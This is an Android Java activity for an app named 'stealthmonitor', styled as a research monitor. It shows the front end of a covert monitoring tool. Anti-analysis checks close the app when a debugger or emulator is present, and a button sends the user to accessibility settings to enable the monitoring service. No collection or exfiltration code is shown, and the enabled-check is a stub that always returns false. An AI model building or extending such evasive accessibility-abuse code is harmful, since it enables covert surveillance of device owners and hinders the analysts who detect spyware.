package com.research.stealthmonitor;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import com.research.stealthmonitor.utils.StealthUtils;

public class MainActivity extends Activity {
    
    private TextView statusText;
    private Button enableButton;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Anti-analysis checks
        if (StealthUtils.isDebugging() || StealthUtils.isEmulator()) {
            finish();
            return;
        }
        
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.status_text);
        enableButton = findViewById(R.id.enable_button);
        
        enableButton.setOnClickListener(v -> openAccessibilitySettings());
        
        updateStatus();
    }
    
    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
    }
    
    private void updateStatus() {
        // Check if accessibility service is enabled
        boolean isEnabled = isAccessibilityServiceEnabled();
        
        if (isEnabled) {
            statusText.setText("✓ Research Monitor Active");
            enableButton.setText("Settings");
        } else {
            statusText.setText("⚠ Enable Accessibility Service");
            enableButton.setText("Enable");
        }
    }
    
    private boolean isAccessibilityServiceEnabled() {
        // Simplified check - in real implementation would check Settings.Secure
        return false;
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}